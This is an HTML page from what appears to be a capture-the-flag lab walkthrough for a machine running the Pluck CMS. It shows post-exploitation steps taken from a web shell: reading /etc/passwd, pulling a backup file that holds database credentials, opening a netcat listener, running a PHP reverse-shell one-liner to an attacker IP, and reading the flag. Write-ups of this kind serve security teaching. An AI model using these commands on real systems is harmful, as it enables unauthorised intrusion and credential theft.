<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>4.4 Get user’s shell (First flag)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  <script></script>
</head>
<body><div class="page"><h1 class="title">4.4 Get user’s shell (First flag)</h1><br/><br />Since Pluck is a file-based CMS, you wouldn’t get any database credentials.<br /><br />1. Look at the system's users.<br />    <div class="codebox"><div class="codebox">p0wny@shell<span style="color:#a52a2a;font-weight:700">:</span>…<span style="color:#a52a2a;font-weight:700">/</span>html<span style="color:#a52a2a;font-weight:700">/</span>files#<span style="color:#a52a2a;font-weight:700">cat</span>&nbsp;<span style="color:#a52a2a;font-weight:700">/</span>etc<span style="color:#a52a2a;font-weight:700">/passwd</span>&nbsp;<span style="color:#a52a2a;font-weight:700">|</span>&nbsp;<span style="color:#a52a2a;font-weight:700">grep</span>&nbsp;<span style="color:#a52a2a;font-weight:700">bash</span></div></div><br /><br />	<span style="color:#ffa500;">Output:</span> <br />    <img src="images/687-1.png" alt="images/687-1.png" /><br /><br />2. Go to “/var/backups” and list the files.<br />    <div class="codebox"><div class="codebox">p0wny@shell<span style="color:#a52a2a;font-weight:700">:</span>…<span style="color:#a52a2a;font-weight:700">/</span>html<span style="color:#a52a2a;font-weight:700">/</span>files#&nbsp;<span style="color:#a52a2a;font-weight:700">cd</span>&nbsp;<span style="color:#a52a2a;font-weight:700">/</span>var<span style="color:#a52a2a;font-weight:700">/</span>backups<br />p0wny@shell<span style="color:#a52a2a;font-weight:700">:/</span>var<span style="color:#a52a2a;font-weight:700">/</span>backups#&nbsp;<span style="color:#a52a2a;font-weight:700">ls</span>&nbsp;-l</div></div> <br /><br />	<span style="color:#ffa500;">Output:</span> <br />    <img src="images/687-2.png" alt="images/687-2.png" /><br /><br />    There's a “mysql.bak” file that can be interesting.<br />    <br />3. Download the file and save it on your Kali Machine.<br />    <div class="codebox"><div class="codebox">p0wny@shell<span style="color:#a52a2a;font-weight:700">:/</span>var<span style="color:#a52a2a;font-weight:700">/</span>backups#&nbsp;download&nbsp;mysql.bak</div></div><br /><br />	<span style="color:#ffa500;">Output:</span> <br />    <img src="images/687-3.png" alt="images/687-3.png" /><br /><br />4. Show the file.<br />    <div class="codebox"><div class="codebox"><span style="color:#6a5acd;font-weight:400">$cat</span>&nbsp;mysql.bak</div></div>  <br />   <br />	<span style="color:#ffa500;">Output:</span><br />l  l<img src="images/687-4.png" alt="images/687-4.png" /><br /><br />    It's a Wordpress configuration file.<br />    It shows the Mysql database credentials.<br /><br />5. Open a “netcat” connection on your Kali Machine.<br />    <div class="codebox"><div class="codebox"><span style="color:#6a5acd;font-weight:400">$nc</span>&nbsp;-nlvp&nbsp;4444</div></div> <br />   <br /><br />6. Create a “php reverse shell”.<br />    <div class="codebox"><div class="codebox">p0wny@shell<span style="color:#a52a2a;font-weight:700">:/</span>var<span style="color:#a52a2a;font-weight:700">/</span>backups#&nbsp;php&nbsp;-r&nbsp;<span style="color:#ff00ff;font-weight:400">'$sock=fsockopen("192.168.12.10",4444);exec("bash&nbsp;&lt;&amp;3&nbsp;&gt;&amp;3&nbsp;2&gt;&amp;3");'</span></div></div><br />   <br />	<span style="color:#ffa500;">Output:</span><br />    <img src="images/687-5.png" alt="images/687-5.png" /><br /><br />7. Use the python <a href="https://wiki.python.org/moin/Powerful%20Python%20One-Liners">one-liner</a> to convert this into a proper shell.<br />    Introduce the following commands on the shell:<br />    <div class="codebox"><div class="codebox">python3&nbsp;-c&nbsp;<span style="color:#ff00ff;font-weight:400">'import&nbsp;pty;pty.spawn("/bin/bash")'</span></div></div><br /> <br />	<span style="color:#ffa500;">Output:</span>   <br />    <img src="images/687-6.png" alt="images/687-6.png" /><br /><br />8. Catch the flag.<br />    <div class="codebox"><div class="codebox">www-data@ProximaCentauri<span style="color:#a52a2a;font-weight:700">:/</span>var<span style="color:#a52a2a;font-weight:700">/</span>backups<span style="color:#6a5acd;font-weight:400">$cd</span>&nbsp;<span style="color:#a52a2a;font-weight:700">/</span>var<span style="color:#a52a2a;font-weight:700">/</span>www<span style="color:#a52a2a;font-weight:700">/</span>htmlwww-data@ProximaCentauri<span style="color:#a52a2a;font-weight:700">:/</span>var<span style="color:#a52a2a;font-weight:700">/</span>www<span style="color:#a52a2a;font-weight:700">/</span>html<span style="color:#6a5acd;font-weight:400">$ls</span>&nbsp;-al<br />www-data@ProximaCentauri<span style="color:#a52a2a;font-weight:700">:/</span>var<span style="color:#a52a2a;font-weight:700">/</span>www<span style="color:#a52a2a;font-weight:700">/</span>html$&nbsp;<span style="color:#a52a2a;font-weight:700">cat</span>&nbsp;flag1.txt<br /></div></div><br />   <br />	<span style="color:#ffa500;">Output:</span> <br />    <img src="images/687-7.png" alt="images/687-7.png" /><br /><br />    <img src="images/687-8.png" alt="images/687-8.png" /><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></div></body></html>